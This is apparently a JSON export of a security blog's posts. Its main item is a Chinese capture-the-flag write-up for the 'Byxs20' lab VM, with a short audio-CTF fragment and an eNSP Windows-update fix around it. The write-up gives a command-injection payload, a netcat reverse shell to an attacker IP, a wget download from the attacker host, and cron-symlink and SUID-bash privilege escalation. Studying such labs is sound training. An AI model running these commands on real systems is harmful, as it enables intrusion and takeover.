012.zip\n```\n\u9996\u5148\u5c1d\u8bd5\u76f4\u63a5\u89e3\u538b `012.zip` \u6587\u4ef6\uff0c\u89e3\u538b\u51fa`012.mp3`\n### 2 \u97f3\u9891\u5185\u5bb9\u5206\u6790\n\n\u901a\u8fc7\u64ad\u653e `012.mp3` \u6587\u4ef6\u5e76\u4ed4\u7ec6\u542c\u53d6\u5176\u5185\u5bb9\u3002\u97f3\u9891\u4e2d\u8bf4\u51fa\u7684\u82f1\u6587\u77ed\u8bed\u662f\uff1a\n\n'I love languages'\n\n## 4. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n\n```\nHMV{Ilovelanguages}\n```\nsentence", "top": 0, "createdAt": 1751016735, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P85": {"htmlDir": "docs/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao- (Write-Up).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "Byxs20\u9776\u673a\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a (Write-Up)", "postUrl": "post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/85", "commentNum": 0, "wordCount": 5837, "description": "*   **\u9776\u673a\u540d\u79f0:** Byxs20 (\u5185\u90e8\u6d4b\u8bd5 - \u53ef\u80fd\u53d1\u5e03\u4e8e HackMyVm)\n*   **\u96be\u5ea6:** \u7b80\u5355 (Easy)\n*   **\u76ee\u6807:** \u83b7\u53d6 user.txt \u548c root.txt \u6587\u4ef6\u4e2d\u7684 flag\u3002\n*   **\u5173\u952e\u70b9:** Web \u547d\u4ee4\u6ce8\u5165\u3001Cron \u4efb\u52a1\u5229\u7528\u3001Sudo \u63d0\u6743\n\n---\n\n## 1. \u4fe1\u606f\u6536\u96c6 (Enumeration)\n\n\u521d\u59cb\u9636\u6bb5\u7684\u76ee\u6807\u662f\u5c3d\u53ef\u80fd\u591a\u5730\u4e86\u89e3\u76ee\u6807\u7cfb\u7edf\u3002\n\n* **\u7f51\u7edc\u53d1\u73b0 (arp-scan):**\n  \u4f7f\u7528 `arp-scan` \u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u53d1\u73b0\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u3002\n\n  ```bash\n  sudo arp-scan -l\n  ```\n\n  \u9501\u5b9a\u76ee\u6807 IP \u4e3a `192.168.205.194`\u3002\n\n* **\u7aef\u53e3\u626b\u63cf (nmap):**\n  \u5bf9\u76ee\u6807 IP \u8fdb\u884c\u5168\u7aef\u53e3 TCP \u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n  ```bash\n  nmap -p- 192.168.205.194\n  ```\n\n  \u53d1\u73b0\u5f00\u653e\u4e86\u4e24\u4e2a\u5173\u952e\u7aef\u53e3\uff1a\n\n  *   `22/tcp`: SSH \u670d\u52a1\n  *   `80/tcp`: HTTP \u670d\u52a1 (Web \u670d\u52a1\u5668)\n\n* **Web \u5185\u5bb9\u53d1\u73b0 (gobuster):**\n  \u9488\u5bf9 80 \u7aef\u53e3\u7684 Web \u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u548c\u6587\u4ef6\u679a\u4e3e\u3002\n\n  ```bash\n  gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak\n  ```\n\n  \u53d1\u73b0\u4ee5\u4e0b\u503c\u5f97\u5173\u6ce8\u7684\u8def\u5f84\u548c\u6587\u4ef6\uff1a\n\n  *   `/index.html`: \u7f51\u7ad9\u9996\u9875\u3002\n  *   `/templates/`: \u5b58\u5728\u76ee\u5f55\u5217\u8868\uff0c\u5305\u542b `about.html`, `contact.html`, `home.html` \u7b49\u6a21\u677f\u6587\u4ef6\u3002\n  *   `/template.php`: \u4e00\u4e2a PHP \u811a\u672c\uff0c\u4f3c\u4e4e\u7528\u4e8e\u52a0\u8f7d\u6a21\u677f\u3002\n  *   `/conf/`: \u540c\u6837\u5b58\u5728\u76ee\u5f55\u5217\u8868\uff0c\u53ef\u80fd\u5b58\u653e\u914d\u7f6e\u6587\u4ef6\u3002\n  *   `/ping.php`: \u53e6\u4e00\u4e2a PHP \u811a\u672c\uff0c\u540d\u5b57\u6697\u793a\u5176\u529f\u80fd\u4e0e\u7f51\u7edc ping \u76f8\u5173\u3002\n\n## 2. \u83b7\u53d6\u521d\u6b65\u7acb\u8db3\u70b9 (www-data \u6743\u9650)\n\n* **\u5206\u6790 Web \u529f\u80fd:**\n\n  *   \u5c1d\u8bd5\u8bbf\u95ee `/template.php`\uff0c\u53d1\u73b0\u53ef\u4ee5\u901a\u8fc7 `?page=` \u53c2\u6570\u52a0\u8f7d `/templates/` \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff08\u5982 `?page=about` \u4f1a\u5305\u542b `about.php`\uff09\u3002\u8fd9\u6697\u793a\u5b58\u5728 LFI (\u672c\u5730\u6587\u4ef6\u5305\u542b) \u6f0f\u6d1e\u3002\n  *   \u8fdb\u4e00\u6b65\u6d4b\u8bd5 LFI\uff0c\u5c1d\u8bd5\u8bfb\u53d6 `/etc/passwd` (`?page=../../../../etc/passwd`) \u5931\u8d25\u3002\u9519\u8bef\u4fe1\u606f\u663e\u793a\u811a\u672c\u5728\u8def\u5f84\u672b\u5c3e\u5f3a\u5236\u6dfb\u52a0\u4e86 `.php` \u540e\u7f00\u3002\n  *   **\u91cd\u8981\u53d1\u73b0:** \u5c1d\u8bd5\u5305\u542b\u811a\u672c\u81ea\u8eab (`?page=../template`) \u4e5f\u5931\u8d25\u4e86\uff0c\u5e76\u8fd4\u56de `No such file or directory`\u3002\u8fd9\u5f3a\u70c8\u6697\u793a PHP \u914d\u7f6e\u4e86 `open_basedir`\uff0c\u9650\u5236\u4e86\u6587\u4ef6\u5305\u542b\u7684\u8303\u56f4\uff0c\u4f7f\u5f97\u8fd9\u4e2a LFI \u6f0f\u6d1e\u96be\u4ee5\u76f4\u63a5\u5229\u7528\u6765\u8bfb\u53d6\u654f\u611f\u6587\u4ef6\u3002\n\n* **\u63a2\u7d22 `ping.php`:**\n\n  *   \u76f4\u63a5\u8bbf\u95ee `ping.php` \u8fd4\u56de 'Invalid IP!'\u3002\n  *   \u4f7f\u7528 `ip` \u53c2\u6570 (`ping.php?ip=127.0.0.1`) \u53ef\u4ee5\u6210\u529f\u6267\u884c ping \u547d\u4ee4\u3002\n\n* **\u53d1\u73b0\u9690\u85cf\u53c2\u6570 (wfuzz):**\n  \u4f7f\u7528 `wfuzz` \u5bf9 `ping.php` \u8fdb\u884c\u53c2\u6570 Fuzzing\uff0c\u5bfb\u627e\u9664 `ip` \u4e4b\u5916\u7684\u5176\u4ed6\u53c2\u6570\u3002\n\n  ```bash\n  wfuzz -u 'http://192.168.205.194/ping.php?FUZZ=127.0.0.1' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2\n  ```\n\n  \u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `debug` \u7684\u53c2\u6570\u3002\n\n* **\u547d\u4ee4\u6ce8\u5165 (Command Injection):**\n  **\u6838\u5fc3\u53d1\u73b0\uff1a** \u5355\u72ec\u4f7f\u7528 `ip` \u53c2\u6570\u53ea\u80fd\u6267\u884c ping\uff0c\u5355\u72ec\u4f7f\u7528 `debug` \u53c2\u6570\uff08\u5982\u679c\u6709\u6548\uff09\u4e5f\u65e0\u6cd5\u76f4\u63a5 RCE\u3002**\u5fc5\u987b\u5c06 `ip` \u548c `debug` \u53c2\u6570\u7ed3\u5408\u8d77\u6765**\uff0c\u624d\u80fd\u89e6\u53d1\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\n  \u6d4b\u8bd5\u547d\u4ee4\u6ce8\u5165\uff1a\u4f7f\u7528 `%0A` (URL \u7f16\u7801\u7684\u6362\u884c\u7b26) \u5728 `ip` \u53c2\u6570\u4e2d\u9644\u52a0 `id` \u547d\u4ee4\uff0c\u5e76\u540c\u65f6\u52a0\u4e0a `debug=1` \u53c2\u6570\u3002\n\n  ```bash\n  curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&debug=1'\n  ```\n\n  \u8fd4\u56de\u7684\u8f93\u51fa\u5305\u542b\u4e86 `[*] Debug Mode Activated`\u3001`[+] Raw Command: ping -c 3 127.0.0.1\\nid` \u4ee5\u53ca `id` \u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c (`uid=33(www-data)...`)\uff0c\u786e\u8ba4\u4e86\u547d\u4ee4\u6ce8\u5165\uff01\n\n* **\u83b7\u53d6\u53cd\u5f39 Shell (Reverse Shell):**\n  \u5229\u7528\u8fd9\u4e2a\u547d\u4ee4\u6ce8\u5165\u70b9\u83b7\u53d6\u53cd\u5411 Shell\u3002\n\n  1. \u5728\u653b\u51fb\u673a\u4e0a\u8bbe\u7f6e Netcat \u76d1\u542c\uff1a\n\n     ```bash\n     nc -lvnp 8888\n     ```\n\n  2. \u6784\u9020\u5e76\u53d1\u9001\u53cd\u5f39 Shell \u7684 payload\u3002\u4f7f\u7528 `busybox nc` \u63d0\u9ad8\u517c\u5bb9\u6027\uff0c\u5e76\u5bf9 payload \u8fdb\u884c URL \u7f16\u7801\u3002\n\n     ```bash\n     # Payload: busybox nc [\u4f60\u7684\u653b\u51fb\u673aIP] 8888 -e /bin/bash\n     # URL \u7f16\u7801\u540e: busybox%20nc%20[\u4f60\u7684\u653b\u51fb\u673aIP]%208888%20-e%20%2Fbin%2Fbash\n     curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[\u4f60\u7684\u653b\u51fb\u673aIP]%208888%20-e%20%2Fbin%2Fbash&debug=1'\n     ```\n\n     \u5c06 `[\u4f60\u7684\u653b\u51fb\u673aIP]` \u66ff\u6362\u4e3a\u4f60\u7684 IP\u3002\u6267\u884c\u540e\uff0c`nc` \u76d1\u542c\u7aef\u5e94\u6536\u5230\u8fde\u63a5\u3002\n\n* **\u5347\u7ea7 Shell:**\n  \u4e3a\u4e86\u66f4\u597d\u7684\u4ea4\u4e92\u4f53\u9a8c\uff0c\u5c06\u83b7\u53d6\u5230\u7684\u57fa\u7840 Shell \u5347\u7ea7\u4e3a\u6807\u51c6\u7684 TTY\u3002\n\n  ```bash\n  # \u5728\u53cd\u5f39 Shell \u4e2d\n  script /dev/null -c bash\n  # \u6309 Ctrl+Z\n  # \u5728\u653b\u51fb\u673a\u7ec8\u7aef\n  stty raw -echo; fg\n  # \u6309\u4e24\u6b21 Enter\n  # \u56de\u5230\u53cd\u5f39 Shell\n  reset xterm\n  export TERM=xterm\n  export SHELL=/bin/bash\n  stty rows 40 columns 178 # \u6839\u636e\u5b9e\u9645\u7ec8\u7aef\u8c03\u6574\n  ```\n\n  \u73b0\u5728\u4f60\u62e5\u6709\u4e86\u4e00\u4e2a\u7a33\u5b9a\u7684 `www-data` \u6743\u9650 Shell\u3002\n\n## 3. \u6743\u9650\u63d0\u5347 (Privilege Escalation)\n\n* **\u8fdb\u7a0b\u76d1\u63a7\u4e0e Cron \u4efb\u52a1\u53d1\u73b0 (pspy):**\n  \u4e0a\u4f20\u5e76\u8fd0\u884c `pspy64` \u5de5\u5177\u6765\u76d1\u63a7\u7cfb\u7edf\u8fdb\u7a0b\uff0c\u5bfb\u627e\u63d0\u6743\u673a\u4f1a\u3002\n\n  1. \u5728\u653b\u51fb\u673a\u4e0a\u5f00\u542f HTTP \u670d\u52a1\u4ee5\u63d0\u4f9b `pspy64`\u3002\n\n  2. \u5728\u76ee\u6807\u673a `/tmp` \u76ee\u5f55\u4e0b\u4e0b\u8f7d\u5e76\u8fd0\u884c `pspy64`\u3002\n\n     ```bash\n     # \u5728\u76ee\u6807\u673a www-data Shell \u4e2d\n     cd /tmp\n     busybox wget http://[\u4f60\u7684\u653b\u51fb\u673aIP]/pspy64\n     chmod +x pspy64\n     ./pspy64\n     ```\n\n     `pspy64` \u7684\u8f93\u51fa\u63ed\u793a\u4e86\u4e00\u4e2a\u4ee5 root \u6743\u9650 (`UID=0`) \u5b9a\u671f\u6267\u884c\u7684 Cron \u4efb\u52a1\uff1a\n\n  ```\n  2025/04/20 09:42:01 CMD: UID=0 PID=658 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf\n  ```\n\n  \u8fd9\u4e2a\u4efb\u52a1\u6bcf\u5206\u949f\u4f1a\u5c06 `/var/www/html/conf/apache2.conf.bak` \u8986\u76d6\u5230 `/etc/apache2/apache2.conf`\u3002\u7531\u4e8e `www-data` \u7528\u6237\u901a\u5e38\u5bf9 `/var/www/html/conf` \u76ee\u5f55\u6709\u5199\u6743\u9650\uff0c\u8fd9\u6210\u4e3a\u4e86\u63d0\u6743\u7684\u5173\u952e\u3002\n\n* **\u63d0\u6743\u65b9\u6cd5 1: Cron + \u7b26\u53f7\u94fe\u63a5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6**\n  \u5229\u7528 Cron \u4efb\u52a1\u8986\u76d6\u6587\u4ef6\u7684\u884c\u4e3a\uff0c\u901a\u8fc7\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\u6765\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\n\n  1. **\u8bfb\u53d6 user flag:** \u5c06 `apache2.conf.bak` \u94fe\u63a5\u5230 `user.txt`\u3002\n\n     ```bash\n     cd /var/www/html/conf\n     ln -sf /home/welcome/user.txt apache2.conf.bak\n     ```\n\n  2. \u7b49\u5f85 Cron \u4efb\u52a1\u6267\u884c\uff08\u6700\u591a 1 \u5206\u949f\uff09\u3002\n\n  3. \u8bfb\u53d6\u88ab\u8986\u76d6\u540e\u7684 Apache \u914d\u7f6e\u6587\u4ef6\uff0c\u5373\u5f97\u5230 `user.txt` \u7684\u5185\u5bb9\u3002\n\n     ```bash\n     cat /etc/apache2/apache2.conf\n     # -> flag{user-05659dca555d4ddbc396b319645f3d2a}\n     ```\n\n  4. **\u8bfb\u53d6 root flag:** \u5220\u9664\u65e7\u94fe\u63a5\uff0c\u521b\u5efa\u65b0\u94fe\u63a5\u6307\u5411 `root.txt`\u3002\n\n     ```bash\n     rm apache2.conf.bak\n     touch apache2.conf.bak\n     ln -sf /root/root.txt apache2.conf.bak\n     ```\n\n  5. \u518d\u6b21\u7b49\u5f85 Cron \u4efb\u52a1\u6267\u884c\u3002\n\n  6. \u8bfb\u53d6 Apache \u914d\u7f6e\u6587\u4ef6\u5f97\u5230 `root.txt` \u7684\u5185\u5bb9\u3002\n\n     ```bash\n     cat /etc/apache2/apache2.conf\n     # -> flag{root-f9ef88715e3bbec612f9f88d64ae3a99}\n     ```\n\n* **\u63d0\u6743\u65b9\u6cd5 2: Cron \u4fee\u6539\u914d\u7f6e + \u7528\u6237\u5207\u6362 + Sudo \u63d0\u6743**\n  \u8fd9\u662f\u4e00\u4e2a\u66f4\u66f2\u6298\u4f46\u540c\u6837\u6709\u6548\u7684\u65b9\u6cd5\u3002\n\n  1. **\u4fee\u6539 Apache \u914d\u7f6e:** \u5229\u7528 Cron \u4efb\u52a1\uff0c\u4fee\u6539 Apache \u7684\u8fd0\u884c\u7528\u6237\u4e3a `welcome`\u3002\n\n     ```bash\n     cd /var/www/html/conf\n     nano apache2.conf.bak\n     User welcome\n     Group welcome\n     ```\n\n  2. \u7b49\u5f85 Cron \u6267\u884c\uff0c\u5e76\u8ba9 Apache \u670d\u52a1\u4ee5\u65b0\u7528\u6237\u8eab\u4efd\u8fd0\u884c\uff08\u53ef\u4ee5\u76f4\u63a5`sudo /usr/sbin/reboot`\uff09\u3002\n\n  3. **\u83b7\u53d6 `welcome` Shell:** \u518d\u6b21\u4f7f\u7528\u4e4b\u524d\u7684\u547d\u4ee4\u6ce8\u5165\u83b7\u53d6\u53cd\u5f39 Shell\u3002\u8fde\u63a5\u540e\u786e\u8ba4\u7528\u6237\u8eab\u4efd\u3002\n\n     ```bash\n     # ... \u83b7\u53d6\u53cd\u5f39 Shell ...\n     id\n     # \u5e94\u663e\u793a uid=1000(welcome) ...\n     ```\n\n  4. **\u68c0\u67e5 Sudo \u6743\u9650:** \u4f5c\u4e3a `welcome` \u7528\u6237\uff0c\u67e5\u770b\u5176 `sudo` \u6743\u9650\u3002\n\n     ```bash\n     sudo -l\n     ```\n\n     \u53d1\u73b0 `welcome` \u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c `/home/welcome/test/test`\u3002\n\n  5. **\u5229\u7528 Sudo \u89c4\u5219:** \u7531\u4e8e `welcome` \u53ef\u4ee5\u63a7\u5236 `test/test` \u811a\u672c\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u6784\u9020\u6076\u610f\u811a\u672c\u3002\n\n  6. \u521b\u5efa\u811a\u672c\uff0c\u8d4b\u4e88 `/bin/bash` SUID \u6743\u9650\u3002\n\n     ```bash\n     mv /home/welcome/test /home/welcome/test1\n     mkdir /home/welcome/test\n     echo '#!/bin/bash' > /home/welcome/test/test\n     echo 'chmod u+s /bin/bash' >> /home/welcome/test/test\n     chmod +x /home/welcome/test/test\n     ```\n\n  7. \u901a\u8fc7 `sudo` \u6267\u884c\u8be5\u811a\u672c\u3002\n\n     ```bash\n     sudo /home/welcome/test/test\n     ```\n\n  8. **\u83b7\u53d6 Root:** \u6267\u884c\u5e26\u6709 SUID \u6743\u9650\u7684 `bash`\u3002\n\n     ```bash\n     bash -p\n     id\n     # \u5e94\u663e\u793a euid=0(root)\n     ```\n\n     \u6210\u529f\u83b7\u53d6 root \u6743\u9650\u3002\n\n## 4. \u83b7\u53d6 Flag\n\n*   **User Flag:** `flag{user-05659dca555d4ddbc396b319645f3d2a}` (\u4f4d\u4e8e `/home/welcome/user.txt`)\n*   **Root Flag:** `flag{root-f9ef88715e3bbec612f9f88d64ae3a99}` (\u4f4d\u4e8e `/root/root.txt`)sentence", "top": 0, "createdAt": 1751016738, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P86": {"htmlDir": "docs/post/eNSP -zai- Windows 11 24H2 -shang-de-jian-rong-xing-wen-ti-yi-tong-guo- KB5053656 -geng-xin-jie-jue.html", "labels": ["\u77e5\u8bc6"], "postTitle": "eNSP \u5728 Windows 11 24H2 \u4e0a\u7684\u517c\u5bb9\u6027\u95ee\u9898\u5df2\u901a\u8fc7 KB5053656 \u66f4\u65b0\u89e3\u51b3", "postUrl": "post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/86", "commentNum": 0, "wordCount": 1560, "description": "## \u95ee\u9898\u80cc\u666f\n\n\u8bb8\u591a\u7528\u6237\u5728\u5c06 Windows 11 \u64cd\u4f5c\u7cfb\u7edf\u5347\u7ea7\u5230 **Version 24H2** \u540e\uff0c\u9047\u5230\u4e86\u534e\u4e3a\u7f51\u7edc\u6a21\u62df\u5e73\u53f0 eNSP \u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u7684\u95ee\u9898\u3002\u5177\u4f53\u8868\u73b0\u901a\u5e38\u4e3a\u542f\u52a8 AR \u8def\u7531\u5668\u7b49\u8bbe\u5907\u65f6\u5931\u8d25\uff0c\u5e76\u53ef\u80fd\u4f34\u968f **\u9519\u8bef\u4ee3\u7801 40 (Error Code 40)** \u7684\u63d0\u793a\u3002\u8fd9\u7ed9\u4f9d\u8d56 eNSP \u8fdb\u884c\u5b66\u4e60\u548c\u5b9e\u9a8c\u7684\u7528\u6237\u5e26\u6765\u4e86\u4e0d\u4fbf\u3002\n\n## \u89e3\u51b3\u65b9\u6848\uff1a\u5b98\u65b9\u8865\u4e01 KB5053656\n\n\u597d\u6d88\u606f\u662f\uff0c\u5fae\u8f6f\u5b98\u65b9\u5df2\u7ecf\u610f\u8bc6\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u53d1\u5e03\u4e86\u76f8\u5e94\u7684\u4fee\u590d\u8865\u4e01\u3002\u6839\u636e\u6700\u65b0\u4fe1\u606f\uff08\u66f4\u65b0\u4e8e 20250408 \u5de6\u53f3\uff09\uff0cWindows \u66f4\u65b0 **KB5053656** \u5df2\u7ecf\u89e3\u51b3\u4e86 eNSP \u5728 Windows 11 24H2 \u4e0a\u7684\u517c\u5bb9\u6027\u95ee\u9898\u3002\n\n\u6b64\u66f4\u65b0\u5305\u542b\u4e86\u591a\u9879\u65b0\u529f\u80fd\u3001\u529f\u80fd\u4f18\u5316\u548c\u95ee\u9898\u4fee\u590d\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u4e86\u5bf9\u5bfc\u81f4 eNSP \u5f02\u5e38\u7684\u5e95\u5c42\u95ee\u9898\u7684\u4fee\u6b63\u3002\u8be5\u8865\u4e01\u9002\u7528\u4e8e **Windows 11 \u5bb6\u5ead\u7248\u3001\u4e13\u4e1a\u7248\u548c\u4e13\u4e1a\u5de5\u4f5c\u7ad9\u7248**\u3002\n\n## \u5982\u4f55\u83b7\u53d6\u5e76\u5b89\u88c5\u4fee\u590d\u8865\u4e01\n\n\u8bf7\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u64cd\u4f5c\uff0c\u4ee5\u786e\u4fdd\u60a8\u7684\u7cfb\u7edf\u5b89\u88c5\u4e86\u5fc5\u8981\u7684\u66f4\u65b0\uff1a\n\n1.  **\u6253\u5f00 Windows \u66f4\u65b0\uff1a**\n    *   \u70b9\u51fb \u201c\u5f00\u59cb\u201d \u83dc\u5355\uff0c\u9009\u62e9 \u201c\u8bbe\u7f6e\u201d\u3002\n    *   \u5728 \u201c\u8bbe\u7f6e\u201d \u7a97\u53e3\u4e2d\uff0c\u5bfc\u822a\u81f3 \u201cWindows \u66f4\u65b0\u201d\u3002\n\n2.  **\u68c0\u67e5\u5e76\u83b7\u53d6\u66f4\u65b0\uff1a**\n    *   \u70b9\u51fb **\u201c\u68c0\u67e5\u66f4\u65b0\u201d** \u6216 **\u201c\u83b7\u53d6\u66f4\u65b0\u201d** \u6309\u94ae\u3002\n    *   \u7cfb\u7edf\u5c06\u5f00\u59cb\u67e5\u627e\u53ef\u7528\u7684\u66f4\u65b0\u3002\u5982\u679c\u60a8\u5df2\u7ecf\u5347\u7ea7\u5230 Win11 24H2\uff0c\u53ef\u80fd\u4f1a\u770b\u5230\u591a\u4e2a\u5f85\u5b89\u88c5\u7684\u66f4\u65b0\u3002\n    *   \u8bf7\u91cd\u70b9\u5173\u6ce8\u5e76\u786e\u4fdd\u5b89\u88c5\u540d\u4e3a **\u201c2025-\u9002\u7528\u4e8e Windows 11 Version 24H2 \u7684 03 \u7d2f\u79ef\u66f4\u65b0\uff0c\u9002\u5408\u57fa\u4e8e x64 \u7684\u7cfb\u7edf (KB5053656)\u201d** \u7684\u8865\u4e01\u3002\n    *   *\u6ce8\u610f\uff1a\u66f4\u65b0\u540d\u79f0\u4e2d\u7684 '2025-...' \u53ef\u80fd\u4e0e\u53d1\u5e03\u65f6\u95f4\u76f8\u5173\uff0c\u5173\u952e\u662f\u8bc6\u522b **KB5053656** \u8fd9\u4e2a\u7f16\u53f7\u3002*\n\n3.  **\u5b89\u88c5\u5e76\u91cd\u542f\uff1a**\n    *   \u8ba9 Windows \u4e0b\u8f7d\u5e76\u5b89\u88c5\u6240\u6709\u9009\u5b9a\u7684\u66f4\u65b0\uff0c\u5305\u62ec KB5053656\u3002\n    *   \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6839\u636e\u7cfb\u7edf\u63d0\u793a **\u91cd\u542f\u60a8\u7684\u8ba1\u7b97\u673a** \u4ee5\u4f7f\u66f4\u65b0\u751f\u6548\u3002\n\n## \u9a8c\u8bc1\u4fee\u590d\u7ed3\u679c\n\n\u6210\u529f\u5b89\u88c5 KB5053656 \u66f4\u65b0\u5e76\u91cd\u542f\u8ba1\u7b97\u673a\u540e\uff1a\n\n1.  \u542f\u52a8 eNSP \u5e94\u7528\u7a0b\u5e8f\u3002\n2.  \u5c1d\u8bd5\u65b0\u5efa\u4e00\u4e2a\u62d3\u6251\uff0c\u5e76\u6dfb\u52a0\u4e00\u4e2a AR \u8def\u7531\u5668\u6216\u5176\u4ed6\u4e4b\u524d\u65e0\u6cd5\u542f\u52a8\u7684\u8bbe\u5907\u3002\n3.  \u542f\u52a8\u8be5\u8bbe\u5907\u3002\n4.  \u5982\u679c\u8bbe\u5907\u80fd\u591f\u6210\u529f\u542f\u52a8\u5e76\u8fdb\u5165\u547d\u4ee4\u884c\u754c\u9762\uff0c\u5219\u8868\u793a\u95ee\u9898\u5df2\u89e3\u51b3\u3002\n\n## \u5b89\u88c5\u66f4\u65b0\u540e\u4ecd\u9047\u9519\u8bef\u4ee3\u7801 40\uff1f\n\n\u5982\u679c\u5728\u5b89\u88c5\u4e86 KB5053656 \u8865\u4e01\u4e4b\u540e\uff0c\u542f\u52a8 AR \u8bbe\u5907\u65f6 **\u4ecd\u7136** \u9047\u5230\u9519\u8bef\u4ee3\u7801 40\uff0c\u90a3\u4e48\u8fd9\u5f88\u53ef\u80fd\u4e0d\u518d\u662f\u7531\u4e8e Windows 11 24H2 \u7684\u517c\u5bb9\u6027\u95ee\u9898\u5f15\u8d77\u7684\u3002\u6b64\u65f6\uff0c\u60a8\u5e94\u8be5\u6309\u7167 **\u89e3\u51b3 eNSP \u9519\u8bef\u4ee3\u7801 40 \u7684\u5e38\u89c4\u65b9\u6cd5** \u8fdb\u884c\u6392\u67e5\uff0c\u5e38\u89c1\u539f\u56e0\u548c\u89e3\u51b3\u65b9\u6cd5\u5305\u62ec\uff1a\n\n*   \u68c0\u67e5 VirtualBox \u7684\u7248\u672c\u662f\u5426\u4e0e eNSP \u517c\u5bb9\u3002\n*   \u786e\u4fdd VirtualBox \u7684\u7f51\u7edc\u9002\u914d\u5668\u8bbe\u7f6e\u6b63\u786e\u3002\n*   \u68c0\u67e5 Windows \u9632\u706b\u5899\u6216\u7b2c\u4e09\u65b9\u5b89\u5168\u8f6f\u4ef6\u662f\u5426\u963b\u6b62\u4e86 eNSP \u6216 VirtualBox \u7684\u901a\u4fe1\u3002\n*   \u5c1d\u8bd5\u91cd\u65b0\u6ce8\u518c AR \u8bbe\u5907\u3002\n*   \u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c eNSP\u3002\n\n## \u7ed3\u8bba\n\nWindows 11 Version 24H2 \u4e0e eNSP \u7684\u517c\u5bb9\u6027\u95ee\u9898\u73b0\u5df2\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u53d1\u5e03\u7684 **KB5053656** \u66f4\u65b0\u5f97\u5230**\u5b8c\u5168\u89e3\u51b3**\u3002\u9047\u5230\u6b64\u95ee\u9898\u7684\u7528\u6237\u5e94\u5c3d\u5feb\u901a\u8fc7 Windows Update \u5b89\u88c5\u6b64\u8865\u4e01\uff0c\u4ee5\u6062\u590d eNSP \u7684\u6b63\u5e38\u4f7f\u7528\u3002\u5982\u679c\u5b89\u88c5\u8865\u4e01\u540e\u4ecd\u6709\u95ee\u9898\uff0c\u8bf7\u8f6c\u5411\u6392\u67e5 eNSP \u672c\u8eab\u6216\u5176\u4f9d\u8d56\u73af\u5883\uff08\u5982 VirtualBox\uff09\u7684\u5e38\u89c1\u914d\u7f6e\u95ee\u9898\u3002sentence", "top": 0, "createdAt": 1751016741, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P87": {"htmlDir": "docs/post/HackMyVM -you-hou-fu-zhu-jiao-ben.html", "labels": ["\u5de5\u5177"], "postTitle": "HackMyVM \u6cb9\u7334\u8f85\u52a9\u811a\u672c", "postUrl": "post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/87", "commentNum": 0, "wordCount": 4200, "description": "## 1. \u8d77\u56e0 \ud83e\udd14\n\n\u6700\u8fd1\u901b\u6211\u535a\u5ba2\u7684\u65b0\u670b\u53cb\u597d\u50cf\u591a\u4e86\u8d77\u6765\uff0c\u4e0d\u5c11\u4eba\u88ab\u5b89\u5229\u53bb\u73a9 **HackMyVM** 